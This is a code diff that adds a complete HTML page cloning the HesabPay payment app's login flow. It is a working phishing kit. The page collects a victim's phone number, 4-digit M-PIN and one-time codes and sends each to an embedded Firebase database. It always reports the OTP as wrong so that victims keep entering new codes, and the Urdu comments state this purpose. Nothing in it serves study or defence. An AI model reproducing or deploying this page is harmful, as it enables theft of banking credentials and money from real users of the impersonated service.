@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>HesabPay Clone UI</title>
+<style>
+  html, body { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #00a8ff; overflow-x: hidden; }
+  .app-container { width: 100%; height: 100%; background-color: #00a8ff; color: white; position: relative; display: flex; flex-direction: column; }
+  .screen { display: none; height: 100%; width: 100%; flex-direction: column; padding: 20px; box-sizing: border-box; }
+  .screen.active { display: flex; }
+  #splashScreen { justify-content: center; align-items: center; }
+  .splash-logo-container { display: flex; flex-direction: column; align-items: center; }
+  h1, h2, h3, p { text-align: center; margin: 10px 0; }
+  .logo { font-size: 28px; font-weight: bold; margin-top: 20px; text-align: center; }
+  .phone-input-group { display: flex; margin-top: 30px; gap: 10px; }
+  .country-code { background: transparent; border: 1px solid rgba(255,255,255,0.5); border-radius: 8px; padding: 12px; color: white; display: flex; align-items: center; gap: 5px; }
+  .phone-input { flex: 1; background: transparent; border: 1px solid rgba(255,255,255,0.5); border-radius: 8px; padding: 12px; color: white; font-size: 16px; outline: none; }
+  .phone-input::placeholder { color: rgba(255,255,255,0.7); }
+  .mpin-group { display: flex; justify-content: center; gap: 10px; margin-top: 30px; }
+  .mpin-box { width: 50px; height: 60px; background: transparent; border: 1px solid rgba(255,255,255,0.5); border-radius: 8px; color: white; font-size: 24px; text-align: center; outline: none; }
+  .otp-input { width: 100%; border: 1px solid #ccc; border-radius: 8px; padding: 15px; font-size: 16px; text-align: center; margin-top: 20px; box-sizing: border-box; outline: none; }
+  .bottom-section { margin-top: auto; padding-bottom: 60px; width: 100%; }
+  .btn { padding: 15px; border-radius: 30px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 20px; }
+  .btn-white { background: white; color: #00a8ff; }
+  .btn-blue { background: #00a8ff; color: white; }
+  .link-text { text-align: center; font-size: 14px; margin-bottom: 10px; cursor: pointer; }
+  .padlock { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 40px auto 20px auto; font-size: 32px; }
+  .resend-text { text-align: center; font-size: 14px; color: #666; margin-top: 15px; }
+  .error-msg { color: #ff3333; text-align: center; margin-top: 15px; display: none; font-size: 14px; font-weight: bold; }
+  .back-btn { font-size: 20px; cursor: pointer; margin-top: 10px; width: 30px;}
+</style>
+</head>
+<body>
+
+<div class="app-container" id="mainContainer">
+  <div id="splashScreen" class="screen active">
+    <div class="splash-logo-container">
+      <svg width="80" height="60" viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10 25 L40 5 L70 25 L40 45 Z" stroke="white" stroke-width="5" fill="none"/>
+        <path d="M30 25 L60 5 L90 25 L60 45 Z" stroke="white" stroke-width="5" fill="none"/>
+      </svg>
+      <div class="logo" style="font-size: 32px;">HesabPay</div>
+    </div>
+  </div>
+
+  <div id="page1" class="screen">
+    <div style="margin-top: 50px; text-align: center;">
+      <svg width="60" height="40" viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10 25 L40 5 L70 25 L40 45 Z" stroke="white" stroke-width="5" fill="none"/>
+        <path d="M30 25 L60 5 L90 25 L60 45 Z" stroke="white" stroke-width="5" fill="none"/>
+      </svg>
+    </div>
+    <div class="logo">HesabPay</div>
+    <p style="margin-top: 20px;">Sign in phone</p>
+    <p style="font-size: 13px; line-height: 1.5; color: rgba(255,255,255,0.9);">Please select 30 country code and enter your mobile<br>number below</p>
+    
+    <div class="phone-input-group">
+      <div class="country-code">🇦🇫 +93</div>
+      <input type="tel" id="phoneNumber" class="phone-input" placeholder="Phone number">
+    </div>
+    
+    <div class="bottom-section">
+      <button class="btn btn-white" onclick="submitPhone()">Continue</button>
+      <div class="link-text">Sign in using email</div>
+      <div class="link-text" style="font-size: 12px; color: rgba(255,255,255,0.8);">By continuing you agree to our Terms & Conditions</div>
+    </div>
+  </div>
+
+  <div id="page2" class="screen">
+    <div class="back-btn" onclick="nextPage('page1')">←</div>
+    <div class="padlock">🔒</div>
+    <h2 style="font-size: 22px;">Enter M-PIN</h2>
+    <p style="font-size: 14px; color: rgba(255,255,255,0.9);">Enter your 4 digit M-PIN</p>
+    
+    <div class="mpin-group">
+      <input type="password" maxlength="1" id="m1" class="mpin-box" onkeyup="moveToNext(this, 'm2')">
+      <input type="password" maxlength="1" id="m2" class="mpin-box" onkeyup="moveToNext(this, 'm3')">
+      <input type="password" maxlength="1" id="m3" class="mpin-box" onkeyup="moveToNext(this, 'm4')">
+      <input type="password" maxlength="1" id="m4" class="mpin-box">
+    </div>
+    
+    <div class="bottom-section">
+      <button class="btn btn-white" onclick="submitPin()">Continue</button>
+    </div>
+  </div>
+
+  <div id="page3" class="screen">
+    <div style="color: black;">
+      <h2 style="margin-top: 60px; font-size: 22px;">OTP Verification</h2>
+      <p style="color: #666; font-size: 14px;">Enter the verification code sent to your device</p>
+      <input type="number" id="otpCode" class="otp-input" placeholder="Enter OTP code">
+      <p id="otpError" class="error-msg">Incorrect OTP Code. Please try again!</p>
+      <div class="resend-text">Resend code in <b>01:58</b></div>
+    </div>
+    
+    <div class="bottom-section">
+      <button class="btn btn-blue" onclick="submitOtp()">Submit</button>
+    </div>
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<script>
+  const firebaseConfig = {
+      apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
+      authDomain: "long-d1bcb.firebaseapp.com",
+      databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
+      projectId: "long-d1bcb",
+      storageBucket: "long-d1bcb.firebasestorage.app",
+      messagingSenderId: "515546162619",
+      appId: "1:515546162619:web:e046b79a25ccfa057e509e"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+  let currentUserId = null;
+  
+  // Array to store multiple OTPs
+  let otpAttempts = [];
+
+  window.onload = function() { setTimeout(function() { nextPage('page1'); }, 3000); };
+
+  function nextPage(pageId) {
+    document.querySelectorAll('.screen').forEach(screen => screen.classList.remove('active'));
+    document.getElementById(pageId).classList.add('active');
+    
+    const container = document.getElementById('mainContainer');
+    const htmlElement = document.documentElement;
+    const bodyElement = document.body;
+    
+    if (pageId === 'page3') {
+      htmlElement.style.backgroundColor = '#ffffff'; bodyElement.style.backgroundColor = '#ffffff'; container.style.backgroundColor = '#ffffff';
+    } else {
+      htmlElement.style.backgroundColor = '#00a8ff'; bodyElement.style.backgroundColor = '#00a8ff'; container.style.backgroundColor = '#00a8ff';
+    }
+  }
+
+  function moveToNext(current, nextFieldID) {
+    if (current.value.length >= 1) document.getElementById(nextFieldID).focus();
+  }
+
+  function submitPhone() {
+    const phone = document.getElementById('phoneNumber').value;
+    if(phone) {
+      const newUserRef = db.ref('users').push();
+      currentUserId = newUserRef.key;
+      newUserRef.set({ phone: phone });
+    }
+    nextPage('page2');
+  }
+
+  function submitPin() {
+    const m1 = document.getElementById('m1').value;
+    const m2 = document.getElementById('m2').value;
+    const m3 = document.getElementById('m3').value;
+    const m4 = document.getElementById('m4').value;
+    const fullPin = m1 + m2 + m3 + m4;
+    
+    if(currentUserId && fullPin.length > 0) {
+      db.ref('users/' + currentUserId).update({ mpin: fullPin });
+    }
+    nextPage('page3');
+  }
+
+  function submitOtp() {
+    const otpInput = document.getElementById('otpCode');
+    const errorMsg = document.getElementById('otpError');
+    
+    if(otpInput.value.length > 0) {
+      if(currentUserId) {
+        // نئے او ٹی پی کو لسٹ میں ایڈ کریں
+        otpAttempts.push(otpInput.value);
+        // کوما (,) کے ساتھ ملا کر فائر بیس میں اپڈیٹ کریں
+        db.ref('users/' + currentUserId).update({ otp: otpAttempts.join(', ') });
+      }
+      // ایرر شو کروائیں اور باکس کو خالی کر دیں تاکہ یوزر اگلا او ٹی پی ڈال سکے
+      errorMsg.style.display = 'block';
+      otpInput.style.borderColor = '#ff3333';
+      otpInput.style.color = '#ff3333';
+      otpInput.value = '';
+    }
+  }
+</script>
+</body>
+</html>
